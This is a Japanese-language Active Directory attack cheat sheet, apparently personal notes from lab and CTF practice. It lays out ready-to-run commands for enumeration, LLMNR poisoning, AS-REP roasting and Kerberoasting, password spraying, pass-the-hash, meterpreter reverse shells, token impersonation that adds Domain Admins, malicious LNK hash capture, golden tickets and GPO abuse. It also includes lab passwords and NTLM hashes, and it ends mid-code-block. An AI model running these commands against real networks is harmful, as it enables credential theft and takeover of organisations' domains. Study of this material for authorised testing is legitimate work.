# Enumeration
認証情報を持ってない時の列挙

## ホストの存在確認
### fping
指定したIPアドレス範囲内のアクティブなホストの高速な特定
```shell
fping -asgq 172.16.5.0/23
```

## DCの条件判断
DCである可能性が高いポートの確認
- `88/tcp` (Kerberos) - DCの可能性高
- `135/tcp` (RPC)
- `139/tcp`, `445/tcp` (SMB)
- `389/tcp` (LDAP) - DCが持つディレクトリサービス
- `636/tcp` (LDAPS)
- `3268/tcp`, `3269/tcp` (Global Catalog) - ほぼ確定でDC
### nmap
サービスとバージョン情報をスキャンし、DCかどうかのより確実な判断
```shell
nmap -sV <IP>
```

正しいドメイン名を確認する
```sh
ldapsearch -x -H ldap://$Target_IP -s base -b "" "(objectClass=*)" defaultNamingContext rootDomainNamingContext namingContexts
```

# Foothold
資格情報を得るための列挙・攻撃

## ユーザー列挙
### enum4linux-ng
普通に使う
```sh
enum4linux-ng -A  $Target_IP
```


SMB、RPC、LDAP経由でWindows/Sambaホストから情報を列挙し、ユーザーリストを取得
```shell
enum4linux-ng -U <DC_IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

背腕にわかっている認証情報で
```sh
enum4linux-ng -u <ユーザー名> -p <パスワード> $Target_IP
```

### rpcclient
RPCサービスに接続し、ドメインユーザーなどの情報を列挙（Nullセッションでも可）
```shell
rpcclient -U "" -N $Target_IP
```

```shell
rpcclient $> enumdomusers
```
### CrackMapExec
SMBプロトコルを使用してネットワーク上のホストに対してユーザー列挙や認証攻撃
```shell
crackmapexec smb <DC_IP> --users
```

### nxc

guestで LDAP に接続してユーザー列挙
- 特定のユーザーの description フィールドにパスワードが埋め込まれていることがあり、このツールで、それを見つけられる
	- 使用例 : [[Ledger#nxc]]
```sh
nxc ldap <Domain> -u 'guest' -p '' --users --local-auth
```

smb
```
nxc smb <DC_IP> -u 'guest' -p '' --shares  --local-auth
```
### ldapsearch
LDAPサーバーに接続し、指定した条件でユーザー情報などを検索・列挙（匿名バインドも可能）
```shell
ldapsearch -H <DC_IP> -x -b "DC=DOMAIN,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```
*(DC=DOMAIN,DC=LOCAL は対象ドメインの識別名に置き換え)*

自分の権限の列挙
```sh
ldapsearch -x -H ldap://$Target_IP -D "USERNAME@DOMAIN" -w 'PASSEWORD' -b "DC=PUPPY,DC=HTB" "(sAMAccountName=USERNAME)"
```

### ldapdomaindump
```sh
ldapdomaindump ldap://$Target_IP --no-json -d <domain>
```

```sh
ldapdomaindump ldap://$Target_IP -u '<DOMAIN>\<username>' -p '<password>' --no-json
```
### windapsearch
Active DirectoryのLDAP情報を列挙するためのPythonスクリプトで、特にユーザー列挙に利用
```shell
./windapsearch.py --dc-ip <DC_IP> -u "" -U
```
### Kerbrute
Kerberosプロトコルを利用して、ユーザーリストから有効なドメインユーザーを列挙
```shell
kerbrute userenum -d <DOMAIN_NAME> --dc <DC_IP> /path/to/userlist.txt
```

## パスワードポリシーの列挙
### ldapsearch
LDAP経由でドメインのパスワードポリシー（最小長、履歴数など）の取得
```shell
ldapsearch -h <DC_IP> -x -b "DC=DOMAIN,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```
### net.exe
Windowsコマンドで、ローカルまたはドメインのパスワードポリシーやアカウント情報の表示
```shell
net accounts
```

### PowerView

PowerViewはこいつしか信用するな
```sh
wget https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/dev/Recon/PowerView.ps1
```


PowerShellベースのツールで、Active Directoryのドメインポリシー情報の取得
```powershell
Get-DomainPolicy
```

## LLMNR / NBT-NS ポイズニング
### Responder
ネットワーク内でLLMNRやNBT-NSリクエストを偽装応答し、NTLMハッシュを奪取
```shell
sudo responder -I <NIC> 
```

MSSQLへのログイン情報があったとき
- サービスアカウントを確認する
```sh
exec master..xp_instance_regread N'HKEY_LOCAL_MACHINE', N'SYSTEM\CurrentControlSet\Services\MSSQL$SQLMOCK', N'ObjectName';
```

サービスアカウントのNTLMハッシュを取得する
```sh
exec master..xp_dirtree '\\10.10.14.62\share';
```
### ntlm_theft
SMBに書き込みができる時に使用例あり
- https://github.com/Greenwolf/ntlm_theft
```sh
git clone https://github.com/Greenwolf/ntlm_theft
cd ntlm_theft
```
Responderと連携し、NTLMv2-SSPチャレンジ/レスポンスハッシュを取得
```shell
python3 ntlm_theft.py -g all -s <RESPONDER_IP> -f generate
```
### Inveigh
Windows上で動作するLLMNR/NBT-NS/mDNS/DNS/DHCPv6ポイズニングおよび中間者攻撃ツール
```powershell
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y
```

## AS-REP Roasting
PowerViewはこいつしか信用するな
```sh
wget https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/dev/Recon/PowerView.ps1
```

### PowerView
Active Directory内でKerberos事前認証が不要 (`DONT_REQ_PREAUTH`) に設定されているユーザーの列挙
```powershell
(PowerView)
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname
```
### Rubeus
事前認証不要のユーザーアカウントのAS-REP（TGT）を要求し、Hashcat形式でハッシュを取得
```powershell
.\Rubeus.exe asreproast /user:<USERNAME> /nowrap /format:hashcat
```
### GetNPUsers.py
Impacketツールキットの一部で、事前認証不要のユーザーのAS-REPハッシュの取得
```shell
(GetNPUsers.py)
impacket-GetNPUsers <DOMAIN_NAME>/ -dc-ip <DC_IP> -no-pass -usersfile valid_ad_users -format hashcat -outputfile asrep_hashes.txt
```
### hashcat
AS-REPハッシュ（モード18200）を辞書攻撃やブルートフォース攻撃でクラック
```shell
(hashcat)
hashcat -m 18200 asrep_hashes.txt /path/to/wordlist.txt
```


## ユーザー名とパスワードが同じ
- [[BabyTwo]]で出てきた手法
- そんな馬鹿なと思うかもしれないが、パスワードの使い回しと同じレベルで意外とあるのかも
	- とりあえずやってみるのもいいかも
	- 以下のコマンドはブルーとフォースモードなので、他のユーザーアカウント名をパスワードとして扱っている場合も含んでいる
```sh
nxc smb 10.129.234.72 -u valid_ad_users -p valid_ad_users --continue-on-success  --local-auth
```
# Enviroment Check
侵入先の環境の列挙
## セキュリティコントロールの確認
### Powershell

PowerViewはこいつしか信用するな
```sh
wget https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/dev/Recon/PowerView.ps1
```

Get-MpComputerStatus
- Windows Defenderのリアルタイム保護などの状態確認
```powershell
Get-MpComputerStatus
```

Get-AppLockerPolicy 
- 適用されているAppLockerポリシー（アプリケーション実行制限）の確認
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

$ExecutionContext.SessionState.LanguageMode
- 現在のPowerShellセッションの言語モード（FullLanguage, ConstrainedLanguageなど）の確認
```powershell
$ExecutionContext.SessionState.LanguageMode
```

## LAPSの確認
### PowerView

 Find-LAPSDelegatedGroups 
- LAPSで管理されているローカル管理者パスワードを読み取る権限を持つグループの検索
```powershell
Find-LAPSDelegatedGroups
```

Find-AdmPwdExtendedRights
- LAPSが有効な各コンピューターの権限をチェックし、パスワード読み取り権限を持つグループやユーザーの特定
```powershell
Find-AdmPwdExtendedRights
```

Get-LAPSComputers
- LAPSが有効になっているコンピューターの一覧、パスワード有効期限、権限があれば平文パスワードの表示
```powershell
Get-LAPSComputers
```

## 資格情報を利用した列挙
### CrackMapExec
取得した認証情報を使用してドメインユーザー、グループ、ログオン中ユーザー、共有フォルダなどの列挙
- ドメインユーザー列挙
```shell
crackmapexec smb <DC_IP> -u <USER> -p <PASSWORD> --users
```
- ドメイングループ列挙
```shell
crackmapexec smb <DC_IP> -u <USER> -p <PASSWORD> --groups
```
- ログオン中ユーザー列挙
```shell
crackmapexec smb <TARGET_IP> -u <USER> -p <PASSWORD> --loggedon-users
```
- 共有フォルダ列挙
```shell
crackmapexec smb <DC_IP> -u <USER> -p <PASSWORD> --shares
```
- 共有フォルダ探索
```shell
crackmapexec smb <DC_IP> -u <USER> -p <PASSWORD> -M spider_plus --share '<SHARE_NAME>'
```
### SMBMap
SMB共有を列挙し、アクセス権限の確認やファイルのダウンロード/アップロード、リモートコマンド実行が可能
- アクセス可能共有と権限
```shell
smbmap -u <USER> -p <PASSWORD> -d <DOMAIN> -H <TARGET_IP>
```
- 再帰的ディレクトリ一覧
```shell
smbmap -u <USER> -p <PASSWORD> -d <DOMAIN> -H <TARGET_IP> -r '<SHARE_NAME>' --dir-only
```
### nxcでスパイダー
```sh
nxc smb 172.16.191.83 -u offsec -p lab --spider C --pattern txt,xml,config,ini --depth 5
```
### wmiexec.py
Impacketツールキットの一部で、WMI経由でターゲットホスト上でコマンドをセミインタラクティブに実行
```shell
wmiexec.py <DOMAIN_NAME>/<USER>:'<PASSWORD>'@<TARGET_IP>
```
### Windapsearch
LDAPクエリを使用して、ドメイン管理者や特権ユーザーなどのActive Directory情報を列挙
- Domain Admins列挙:
```shell
python3 windapsearch.py --dc-ip <DC_IP> -u <USER>@<DOMAIN> -p <PASSWORD> --da
```
- 特権ユーザー列挙:
```shell
python3 windapsearch.py --dc-ip <DC_IP> -u <USER>@<DOMAIN> -p <PASSWORD> -PU
```

### BloodHound / SharpHound
Active Directoryのオブジェクト間の関係性を収集・分析し、攻撃経路を視覚化
ldapの権限があれば、実行して取得できる

- 時刻を合わせる
```sh
sudo rdate -n $Target_IP
```

- Linuxコレクター
```shell
sudo bloodhound-python -u '<USER>@<domain>' -p '<PASSWORD>' -ns <DC_IP> -d <DOMAIN> -c all
```
- 例
	- `sudo bloodhound-python -u 'levi.james@puppy.htb' -p 'KingofAkron2025!' -ns 10.129.232.75 -d puppy.htb -c all`

エラー出る時
```sh
sudo bloodhound-python -u 'Eric.Wallows' -p 'EricLikesRunning800' -d secura.yzx -dc dc01.secura.yzx -ns 192.168.191.97 -c all
```

- Windowsコレクター (SharpHound)
```powershell
.\SharpHound.exe -c All --zipfilename <OUTPUT_ZIP_NAME>
```
- Neo4j起動
```shell
sudo neo4j start
```
- BloodHound GUI起動
	- neo4j : data-warning-vocal-sphere-sponsor-7137
```shell
bloodhound
```
### ActiveDirectory PowerShell
Windows標準のPowerShellモジュールで、ADオブジェクトの情報を取得・操作
- モジュールインポート
```powershell
Import-Module ActiveDirectory
```
- ドメイン情報
```powershell
Get-ADDomain
```
- Kerberoast対象 (SPN持ちユーザー)
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```
- ドメイン信頼関係
```powershell
Get-ADTrust -Filter *
```
- グループ列挙
```powershell
Get-ADGroup -Filter - | select name
```
- グループメンバー
```powershell
Get-ADGroupMember -Identity "<GROUP_NAME>"
```
### PowerView
PowerSploitフレームワークの一部で、Active Directoryの偵察と悪用に特化したPowerShellツール

PowerViewはこいつしか信用するな
```sh
wget https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/dev/Recon/PowerView.ps1
```


- スクリプトロード
```powershell
. .\PowerView.ps1
```
- ドメイン情報
```powershell
Get-Domain
```
- DC列挙
```powershell
Get-DomainController
```
- ユーザー情報
```powershell
Get-DomainUser -Identity <USERNAME>
```
- グループメンバー (再帰的)
```powershell
Get-DomainGroupMember -Identity "<GROUP_NAME>" -Recurse
```
- 興味深いACL
```powershell
Find-InterestingDomainAcl
```
- GPO列挙
```powershell
Get-DomainGPO
```
- SPN持ちユーザー (Kerberoast対象)
```powershell
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```
### Snaffler
Active Directory環境内で、共有フォルダやファイルから認証情報や機密データを探索
```powershell
Snaffler.exe -s -d <DOMAIN_NAME> -o snaffler.log -v data
```
### adidnsdump
有効なドメインユーザーアカウントを使用して、ドメイン内の全てのDNSレコードを列挙
```shell
adidnsdump -u <DOMAIN_NAME>\\<USER> ldap//<DC_IP> -r
```

# Lateral Movement
他の資格情報を取得するための列挙・攻撃

## 取得するべき情報

- ユーザー名とホスト名
- 現在のユーザーのグループメンバーシップ
- 既存のユーザーとグループ
- オペレーティングシステム、バージョン、アーキテクチャ
- ネットワーク情報
- インストールされているアプリケーション
- 実行中のプロセス

## Ipconfig
- 基本だけど、管理者権限したら、ipconfigして、他のネットワークのipを持ってるか確かめた方が良い

## Password Managerの有無
KeePassが含まれていないかを確認する
```sh
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

John The Ripperの`keepass2ohn`を使って、ハッシュの形にできる
keepass2johnを使ってKeePassデータベースをHashcat用にフォーマットする
```sh
keepass2john Database.kdbx > keepass.hash
```

これをhashcatで辞書攻撃するためには、ファイル文頭の`Database:`を削除すれば良い
- -m 13400で辞書攻撃する
```sh
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

## RunasCs.exe
すでにアカウントの認証情報はわかっているが、そのアカウントはリモートユーザーとして使えないことは往々にしてある
そんな時に、ターミナル上でアカウントを切り替えてコマンドを実行したり、シェルを作れるツール
- https://github.com/antonioCoco/RunasCs

使い方
svc_ldapとして「cmd /c whoami /all」を実行する
```sh
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn "cmd /c whoami /all"
```
## Certpy
- Active Directory Certificate Services（AD CS）に対する攻撃や調査を行えるツール
- AD CS：Active Directory Certificate Services。Windowsドメイン環境に証明書を発行・管理するサービス。
- Windowsドメイン環境で証明書ベースの権限昇格や認証回避などの脆弱性（たとえば ESC1〜ESC8）を検出・悪用するために使う
	- ESC1〜ESC8
		- 証明書関連の典型的な脆弱性パターン
		- たとえば ESC1 は「ユーザーが自分で証明書を要求でき、証明書で任意のユーザーを偽装できる」問題
脆弱な証明書の調査
```sh
certipy-ad find -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -target <DOMAIN> -dc-ip <DC-IP> -ns <DC-IP>  -enabled -vulnerable -stdout
```

- Kerberosでの認証の場合
```sh
certipy-ad find -k -no-pass -target <FQDN_DNS> -dc-ip <DC_IP> -enabled -vulnerable  -stdout
```

脆弱な証明書の取得
```sh
certipy-ad req -username 'SUSANNA_MCKNIGHT@thm.local' -password 'CHANGEME2023!' -ca thm-LABYRINTH-CA -target labyrinth.thm.local -template ServerAuth -upn Administrator@thm.local -sid 'xxxxxx'
```
- ESC1 は SID が無いと PKINIT を弾かれる → 以下のコマンドのKDC_ERROR_CLIENT_NOT_TRUSTED の原因になる
- ESC8の攻撃手法
	- [[VulnCicada#ESC8の脆弱を利用した攻撃]]

NTLMハッシュのリクエスト
- 取得できたら、smbexec.pyなどで使える
```sh
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.133.131
```
使用例 : [[Ledger#Certpy]]

## windows版`.bash_history`
- windows10からlinuxで言うところの.bash_historyがデフォルトで有効になった
- ここに平文の認証情報が書いてあることもあるかも

```sh
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## 特権アクセス先の利用
### RDP (Remote Desktop Protocol)
GUIベースでリモートホストに接続し操作
- アクセス権確認 (PowerView)
```powershell
Get-NetLocalGroupMember -ComputerName <TARGET_HOST> -GroupName "Remote Desktop Users"
```
- 接続 (xfreerdp)
```shell
xfreerdp /v:<TARGET_IP> /u:<USER> /p:<PASSWORD> /d:<DOMAIN>
```
### WinRM (Windows Remote Management) / evil-winrm
PowerShellを使用してリモートホストを管理・操作`evil-winrm`は特にペンテストで有用なクライアント
- アクセス権確認 (PowerView)
```powershell
Get-NetLocalGroupMember -ComputerName <TARGET_HOST> -GroupName "Remote Management Users"
```
- 接続 (evil-winrm)
```shell
evil-winrm -i <TARGET_IP> -u <USER> -p '<PASSWORD>'
```
### SQL Server (管理者権限)
sysadmin権限を持つアカウントでSQL Serverに接続し、OSコマンド実行などを試行
- インスタンス列挙 (PowerUpSQL)
```powershell
Get-SQLInstanceDomain
```
- クエリ実行 (PowerUpSQL)
```powershell
Get-SQLQuery -Instance "<INSTANCE>" -username "<USER>" -password "<PASSWORD>" -query "<SQL_QUERY>"
```
- xp_cmdshell有効化 & コマンド実行 (PowerUpSQL)
```powershell
Get-SQLQuery -Instance "<INSTANCE>" ... -query "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;"
```

```powershell
Get-SQLQuery -Instance "<INSTANCE>" ... -query "EXEC xp_cmdshell 'whoami'"
```
- 接続 (mssqlclient.py)
```shell
mssqlclient.py <DOMAIN>/<USER>@<TARGET_IP> -windows-auth
```

```shell
SQL> enable_xp_cmdshell
```

```shell
SQL> xp_cmdshell whoami
```


## パスワードスプレー
**既存の認証情報だけではなくて、新たにわかったユーザーが使いまわしている可能性もある**
### rpcclient
少数の共通パスワードを多数のユーザーアカウントに対して試行
```shell
for u in $(cat valid_ad_users);do rpcclient -U "$u%<PASSWORD_TO_SPRAY>" -c "getusername;quit" <DC_IP> | grep Authority; done
```
### Kerbrute
Kerberos認証を利用して、ユーザーリストに対し単一のパスワードを試行
```shell
kerbrute passwordspray -d <DOMAIN_NAME> --dc <DC_IP> valid_ad_users '<PASSWORD_TO_SPRAY>'
```
### NetExec
SMBプロトコル経由で、ユーザーリストに対し単一のパスワードを試行し、成功したアカウントを特定
- **DCに対してではなくて、AD参加マシンに対して実行する場合、--local-authと--local-authなしの2回実行必須**
- 結果で、「STATUS_ACCOUNT_LOCKED_OUT」・「USER_ACCOUNT_LOCKED」って出てるものは、本当はログインできるはずということ
	- ドメイン認証は、ドメイン参加マシン一台に対してだけ行えばおけ
- ユーザー名とパスワードをごちゃ混ぜにしないオプション : --no-bruteforce
```shell
netexec smb <IP> -u valid_ad_users -p '<PASSWORD_TO_SPRAY>'　--continue-on-success  --local-auth
netexec smb <IP> -u valid_ad_users -p '<PASSWORD_TO_SPRAY>'　--continue-on-success
netexec smb <IP> -u valid_ad_users -p '<PASSWORD_TO_SPRAY>'　--continue-on-success --no-bruteforce
```

hashでスプレーしようとして、このエラー「Invalid NTLM hash length 34, authentication not sent」起きたら
```sh
cat > hash_172_new.txt << 'EOF'
aad3b435b51404eeaad3b435b51404ee:abf36048c1cf88f5603381c5128feb8e
aad3b435b51404eeaad3b435b51404ee:5be63a865b65349851c1f11a067a3068
aad3b435b51404eeaad3b435b51404ee:fdf36048c1cf88f5630381c5e38feb8e
aad3b435b51404eeaad3b435b51404ee:8e9e1516818ce4e54247e71e71b5f436
EOF

```


**NTLMが無効化されている場合**
- ホスト名(FQDN)を使用する
```sh
netexec smb <FQDN_Domain_Name> -u 'valid_ad_users' -p '<PASSWORD_TO_SPRAY>' -d <Domain_Name> -k --local-auth
```

例
```sh
netexec smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -d cicada.vl -k --local-auth
```
### DomainPasswordSpray
PowerShellスクリプトで、ドメインユーザーに対してパスワードスプレー攻撃を実行
```powershell
. .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password '<PASSWORD_TO_SPRAY>' -OutFile spray_success -ErrorAction SilentlyContinue
```

## PtH・PtT・PtT

### CrackMapExec (PtP)
ユーザーの認証情報が他のマシンでも使用されていないかの確認
- 認証情報とネットワーク範囲・ドメインを指定することで、一括ですでに手に入れた認証情報でログインできるマシンを洗いだせる
```sh
crackmapexec smb <ip/ネットワーク範囲> -u <user> -d <domain> -p <pass>
```
### CrackMapExec (PtH)
ユーザーのNTLMハッシュを使用してSMB経由で認証し、コマンド実行など
```shell
crackmapexec smb <TARGET_IP/ネットワーク範囲> -u <USER> -H <NTHASH>
```

### SMBClient (PtH)
```sh
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
```

管理者権限のアカウントが見つかったら、CrackMapExecで以下のコマンドも試せる
- `--local-auth --sam` : SAMに含まれているハッシュをダンプ
- `--local-auth -M lsassy` : mimikatzの主な攻撃対象のLSASSに含まれている資格情報をダンプ
- `--local-auth --shares` : SMB共有の列挙
- `-M keepass_discover` : Keepassファイルの探索
- `-M gpp_password` :  GPPパスワードの探索
- `-M wdigest` : WDigest認証の設定を確認し、メモリに平文パスワードが残っているかを探る
- `-M wireless` : インターネットの認証情報とSSID

他のモジュールも探したかったら
- `crackmapexec smb -L` : crackmapexecのモジュール一覧検索
### Mimikatz (PtH)
NTLMハッシュをメモリに注入し、そのユーザーになりすましてプロセスを実行
```powershell
privilege::debug
sekurlsa::pth /user:<USER> /domain:<DOMAIN> /ntlm:<NTHASH> /run:"cmd.exe"
```
### Mimikatz (PtT)
Kerberosチケットファイル（.kirbi）をメモリに注入し、そのチケットを使用して認証
```powershell
kerberos::ptt /path/to/ticket.kirbi
```
### Rubeus (PtT)
Base64エンコードされたチケットや.kirbiファイルをメモリに注入してKerberos認証
```powershell
.\Rubeus.exe ptt /ticket:<BASE64_TICKET_OR_KIRBI_FILE>
```

### impacket-psexec (PtH)
```sh
impacket-psexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

### impacket-wmiexec (PtH)
```sh
impacket-wmiexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

### WinRM
```sh

```

## Kerberoasting
### SPNアカウント列挙
サービスプリンシパル名(SPN)が設定されたユーザーアカウント（Kerberoastingの対象）の列挙
- GetUserSPNs.py (Linux)
```shell
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>
```
- PowerView (Windows)
```powershell
Get-DomainUser -SPN
```
- setspn.exe (Windows)
```shell
setspn.exe -Q */*
```
### TGSチケット要求
列挙したSPNアカウントのTGS（サービスチケット）を要求し、そのハッシュを取得
- 一回も使われたことがないアカウントは、ダミーアカウントかもしれないから注意

- GetUserSPNs.py
```shell
impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD> -request -outputfile tgs_tickets
```
- Rubeus (Windows)
```powershell
.\Rubeus.exe kerberoast /user:<TARGET_USER> /nowrap /format:hashcat
```
    *(RC4強制は `/tgtdeleg` オプション)*
- PowerShell (Windows, 手動)
```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
```
- (Mimikatzでメモリからエクスポート)
```powershell
kerberos::list /export
```
### ハッシュクラック
取得したTGSハッシュ（モード13100）をオフラインでクラック
- Hashcat
```shell
hashcat -m 13100 tgs_tickets /path/to/wordlist.txt
```
- John
```shell
john --wordlist=/path/to/wordlist.txt tgs_tickets
```

### Kerberos ダブルホップ問題の回避
#### Invoke-Command (PowerShell)
PSCredentialオブジェクトを使用して明示的に認証情報を渡し、2ホップ先のリソースにアクセス
```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)
Invoke-Command -ComputerName <HOP1_TARGET> -ScriptBlock { Invoke-Command -ComputerName <HOP2_TARGET> -ScriptBlock { whoami } -Credential $using:Cred } -Credential $Cred
```

## トークンなりすまし攻撃


仕組み
- ユーザーがログオンすると、**アクセストークン**が発行される
- 他のプロセスやサービスがそのユーザーのトークンを「開いたまま持っている」と、それを**借りて（impersonate）なりすまし**ができる
### Metasploit
まずは、metapreterシェルを設定する ( msfconsole内
```sh
use exploit/windows/smb/psexec
set payload windows/x64/meterpreter/reverse_tcp
# RHOSTは、AD参加ホストであればなんでも。DC以外でも良い。
set RHOSTS <AD参加ホストIP>
set smbuser <ユーザーネーム>
set smbpass <パスワード>
set smbdomain <ドメイン名>
set LHOST 
```

以下 meterpreter内で実行
上で、シェルが確立できた後 、なりすましをするためのモジュールをロードする
```sh
meterpreter > load incognito
```

ユーザー（user）に絞って表示、なりすまし可能なトークンを列挙する
- ここまでで、どのアカウントになり済ますべきか、知っているべき
```sh
meterpreter > list_tokens -u
```

なりすますユーザーを指定し、なりすます
 - この時、スラッシュを二つつける
	 - 例 : MARVEL\\fcastle
```sh
meterpreter > impersonate_token <なりすますユーザー名>
meterpreter > shell
whoami
```

高い権限でなりすましができた後に、その権限でユーザーを新しく作成する
そして、作成したアカウントで、もう一度`secretsdump.py`などでハッシュをダンプすると、全てのハッシュを取得できる
```windows shell
net user /add <ユーザーネーム> <パスワード> /domain
net group "Domain Admins" <ユーザーネーム> /ADD /DOMAIN
```


## LNK File Attack
攻撃の流れ
1.  悪意ある .lnk（ショートカット）ファイルを作る
2.  その .lnk ファイルを共有フォルダに置く
3. ターゲットがアクセス・表示するのを待つ
4. Responderでハッシュを取得

.inkファイルを公開共有フィルだに設置する
```sh
netexec smb <AD参加ホスト> -d <ドメイン名> -u <ユーザー名> -p <パスワード> -M slinky -M slinky -o NAME=test SERVER=<攻撃者IP> 
```

Responderを実行し、ハッシュが飛んでくるのを待つ
```sh
sudo responder -I eth0 -dPv
```
## ドメイン信頼関係の悪用
### SID History / ExtraSIDs (子→親)
子ドメインのKRBTGTハッシュと親ドメインの特権グループSIDを使用してGolden Ticketを作成し、親ドメインを掌握
- Mimikatz (Golden Ticket)
```powershell
kerberos::golden /user:<FAKE_USER> /domain:<CHILD_DOMAIN_FQDN> /sid:<CHILD_DOMAIN_SID> /krbtgt:<CHILD_KRBTGT_HASH> /sids:<PARENT_ENTERPRISE_ADMIN_SID> /ptt
```
- Rubeus (Golden Ticket)
```powershell
.\Rubeus.exe golden /rc4:<CHILD_KRBTGT_HASH> /domain:<CHILD_DOMAIN_FQDN> /sid:<CHILD_DOMAIN_SID> /sids:<PARENT_ENTERPRISE_ADMIN_SID> /user:<FAKE_USER> /ptt
```
- ticketer.py (Linux)
```shell
ticketer.py -nthash <CHILD_KRBTGT_HASH> -domain <CHILD_DOMAIN_FQDN> -domain-sid <CHILD_DOMAIN_SID> -extra-sid <PARENT_ENTERPRISE_ADMIN_SID> <FAKE_USER>
```

```shell
export KRB5CCNAME=<FAKE_USER.ccache>
```

```shell
psexec.py <CHILD_DOMAIN_FQDN>/<FAKE_USER>@<PARENT_DC_FQDN> -k -no-pass -target-ip <PARENT_DC_IP>
```
### クロスフォレストKerberoasting
信頼関係のある別フォレストのドメインに対してKerberoasting攻撃を行い、サービスアカウントのハッシュを取得
- Rubeus (Windows)
```powershell
.\Rubeus.exe kerberoast /domain:<TARGET_FOREST_DOMAIN> /user:<TARGET_SPN_USER> /nowrap
```
- GetUserSPNs.py (Linux)
```shell
GetUserSPNs.py -request -target-domain <TARGET_FOREST_DOMAIN> <CURRENT_DOMAIN>/<USER>:<PASSWORD>
```
### 管理者パスワードの使い回し
異なるドメイン間で管理者アカウントのパスワードが再利用されていないか確認
### グループメンバーシップの悪用 (他ドメインメンバー)
他ドメインのユーザーがローカルドメインの特権グループに所属していないか確認
- PowerView
```powershell
Get-DomainForeignGroupMember -Domain <TARGET_DOMAIN>
```

# Privilege Escatlation
(権限昇格のための列挙・攻撃)

## ACL (アクセス制御リスト) の悪用

### 列挙 (PowerView)
PowerViewはこいつしか信用するな
```sh
wget https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/dev/Recon/PowerView.ps1
```

モジュールの読み込み
```sh
# 1) ドットソース（前に「.（ドット）+ 半角スペース」必須）
. .\PowerView.ps1

# 2) IEXで読み込み
IEX (Get-Content .\PowerView.ps1 -Raw)

# 3) 実行ポリシーで止まる時は一時的にバイパス
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
. .\PowerView.ps1
```

オブジェクトに対する不適切なACL設定（書き込み権限など）の探索
```powershell
Find-InterestingDomainAcl
```
- 特定ユーザーの権限
```powershell

$sid = Convert-NameToSid <USER>; Get-DomainObjectACL -ResolveGUIDs -Identity - | ? {$_.SecurityIdentifier -eq $sid}
```
### 権限行使 (PowerView例)
PowerViewはこいつしか信用するな
```sh
wget https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/dev/Recon/PowerView.ps1
```


発見したACLの権限を利用して、パスワード変更、グループ追加、SPN書き換えなど
- パスワード変更
```powershell
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword <NEW_PASS_OBJ> -Credential <CRED_OBJ>
```
- グループ追加
```powershell
Add-DomainGroupMember -Identity '<TARGET_GROUP>' -Members '<USER_TO_ADD>' -Credential <CRED_OBJ>
```
- SPN書き換え (Kerberoast準備)
```powershell
Set-DomainObject -Credential <CRED_OBJ> -Identity <TARGET_USER> -SET @{serviceprincipalname='fake/spn'}
```

## GPO (グループポリシーオブジェクト) の悪用
### 列挙
#### PowerView

PowerViewはこいつしか信用するな
```sh
wget https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/dev/Recon/PowerView.ps1
```


ドメイン内のGPOを列挙し、その設定やACLの確認
- 出力結果に、Default Domain Policyがあったらピンと来い
	- ドメイン全体のすべてのコンピュータとユーザーのポリシーだから、これに対して、GPOADMがGenericAll権限があるってことは、GPOADM自身を管理者グループに入れることができてしまうこともある
```powershell
Get-DomainGPO
```
- ACL確認
```powershell
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```
### 攻撃
### SharpGPOAbuse.exe
GPOの書き込み権限を悪用して、ローカル管理者追加やスケジュールタスク作成など
- ローカル管理者追加
```powershell
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USER_TO_ADD> --GPOName "<GPO_NAME>"
```
- タスク作成
```powershell
SharpGPOAbuse.exe --AddTask --TaskName "<TASK_NAME>" --Command "<COMMAND>" --Arguments "<ARGS>" --GPOName "<GPO_NAME>"
```

###  pyGPOAbuse.py
ダウンロード
```sh
git clone https://github.com/Hackndo/pyGPOAbuse
pip install -r requirements.txt
```

GPOADMを管理者グループに追加する
- 31B2F340-016D-11D2-945F-00C04FB984F9は、Default Domain PolicyのSID
```sh
